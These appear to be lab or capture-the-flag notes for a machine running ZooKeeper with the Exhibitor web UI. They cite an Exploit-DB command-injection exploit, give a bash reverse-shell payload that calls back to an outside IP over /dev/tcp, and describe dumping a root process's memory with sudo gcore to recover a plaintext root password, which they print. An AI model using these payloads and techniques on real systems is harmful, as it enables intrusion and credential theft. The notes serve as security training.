## Takeaway
## Metadata
- Port `2181` showing the host is running a `zookeeper` instance. While port `8080` and `8081` is running `Exhibitor` which is Web UI to manage `ZooKeeper` server instances.
	- Run `searchsploit Exhibitor` will identify it is vulnerable to `RCE`. Showing as RCE but is instead more of `Command Injection`.![[Pasted image 20240321180233.png]]
	- https://www.exploit-db.com/exploits/48654
- Running `sudo -l` as `charles` will identify that the user can run `gcore` as `root` without passwords.![[Pasted image 20240321183344.png]]
	- According to `GTFOBin`, `gcore` is used to generate core dumps of running processes.
	- `linpeas` will identify `/usr/bin/password-store` of PID `484` is ran under `root` privilege which potentially contains passwords.![[Pasted image 20240321183852.png]]
	- Run `sudo gcore 484` and running `strings core.484` can identify potential credential pair as `root:ClogKingpinInning731`![[Pasted image 20240321183957.png]]
# Exploitation
## Shell as charles
- Following the steps from https://www.exploit-db.com/exploits/48654 but use `$(/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.45.189/80 0>&1')` as command to receive a reverse shell call back.
# PrivEsc
- Run `su` and enter password `ClogKingpinInning731` to obtain a root shell.